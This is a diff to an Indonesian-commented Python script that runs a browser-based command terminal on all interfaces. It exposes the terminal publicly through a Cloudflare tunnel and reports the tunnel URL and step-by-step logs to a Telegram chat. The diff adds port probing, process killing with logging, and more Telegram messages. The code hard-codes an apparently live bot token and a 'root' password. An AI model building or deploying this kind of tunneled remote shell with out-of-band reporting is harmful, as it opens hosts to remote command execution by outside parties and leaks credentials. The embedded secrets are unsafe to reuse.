@@ -5,6 +5,7 @@ import time
 import requests
 import json
 import base64
+import socket
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 BOT_TOKEN = "8436257967:AAEsPJl35Ksw770gcLPd2tFq0SaEwcGj3Kc"
@@ -17,16 +18,33 @@ AUTH_PASS = "root"
 def send_telegram(text):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=10)
-    except:
-        pass
+        requests.post(url, json={"chat_id": CHAT_ID, "text": text[:4000]}, timeout=10)
+    except Exception as e:
+        print(f"Gagal kirim: {e}")
+
+def log_telegram(text):
+    send_telegram(f"[LOG] {text}")
+
+def is_port_in_use(port):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        return s.connect_ex(('0.0.0.0', port)) == 0
+
+def find_free_port(start_port):
+    port = start_port
+    while is_port_in_use(port):
+        log_telegram(f"Port {port} sibuk, coba {port+1}")
+        port += 1
+    log_telegram(f"Port kosong: {port}")
+    return port
 
 def kill_process(name):
     try:
         subprocess.run(["pkill", "-f", name], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        log_telegram(f"Kill {name} via pkill")
     except FileNotFoundError:
         try:
             subprocess.run(["killall", name], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+            log_telegram(f"Kill {name} via killall")
         except FileNotFoundError:
             try:
                 output = subprocess.check_output(["ps", "aux"], text=True)
@@ -34,8 +52,9 @@ def kill_process(name):
                     if name in line and "grep" not in line:
                         pid = line.split()[1]
                         subprocess.run(["kill", "-9", pid], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-            except:
-                pass
+                        log_telegram(f"Kill {name} PID {pid} via ps")
+            except Exception as e:
+                log_telegram(f"Gagal kill {name}: {e}")
 
 HTML_TERMINAL = '''<!DOCTYPE html>
 <html>
@@ -249,7 +268,8 @@ class SecureExecHandler(BaseHTTPRequestHandler):
         pass
 
 def get_cloudflared_url():
-    for _ in range(30):
+    log_telegram("Mengambil URL dari API Cloudflared...")
+    for i in range(30):
         time.sleep(1)
         try:
             resp = requests.get("http://localhost:4040/api/tunnels", timeout=2)
@@ -258,27 +278,42 @@ def get_cloudflared_url():
                 if data.get('tunnels'):
                     url = data['tunnels'][0].get('public_url')
                     if url:
+                        log_telegram(f"URL ditemukan: {url}")
                         return url
-        except:
-            pass
+        except Exception as e:
+            log_telegram(f"Gagal ambil URL (percobaan {i+1}): {e}")
+    log_telegram("Gagal mendapatkan URL setelah 30 detik.")
     return None
 
-def run_tunnel():
+def run_tunnel(port):
     kill_process("cloudflared")
-    cmd = [CLOUDFLARED_PATH, "tunnel", "--url", f"http://localhost:{PORT}"]
-    log = open("/tmp/cloudflared.log", "w")
-    proc = subprocess.Popen(cmd, stdout=log, stderr=log)
+    log_telegram(f"Menjalankan tunnel ke port {port}")
+    cmd = [CLOUDFLARED_PATH, "tunnel", "--url", f"http://localhost:{port}"]
+    log_file = open("/tmp/cloudflared.log", "w")
+    proc = subprocess.Popen(cmd, stdout=log_file, stderr=log_file)
+    time.sleep(3)
     url = get_cloudflared_url()
     return proc, url
 
 def main():
+    send_telegram("🔄 Memulai Web Terminal...")
+    
+    # Cari port kosong
+    port = find_free_port(PORT)
+    
+    # Download cloudflared
     if not os.path.exists(CLOUDFLARED_PATH):
+        log_telegram("Mengunduh cloudflared...")
         os.makedirs(os.path.dirname(CLOUDFLARED_PATH), exist_ok=True)
         subprocess.run(["curl", "-L", "-o", CLOUDFLARED_PATH,
                        "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"], check=True)
         os.chmod(CLOUDFLARED_PATH, 0o755)
+        log_telegram("cloudflared terunduh.")
+    else:
+        log_telegram("cloudflared sudah ada.")
 
-    cf_proc, tunnel_url = run_tunnel()
+    # Jalankan tunnel
+    cf_proc, tunnel_url = run_tunnel(port)
 
     if tunnel_url:
         send_telegram(
@@ -291,7 +326,9 @@ def main():
     else:
         send_telegram("❌ Gagal mendapatkan URL Cloudflare Tunnel.")
 
-    server = HTTPServer(('0.0.0.0', PORT), SecureExecHandler)
+    # Jalankan web server
+    log_telegram(f"Menjalankan web server di port {port}")
+    server = HTTPServer(('0.0.0.0', port), SecureExecHandler)
     try:
         server.serve_forever()
     except KeyboardInterrupt:
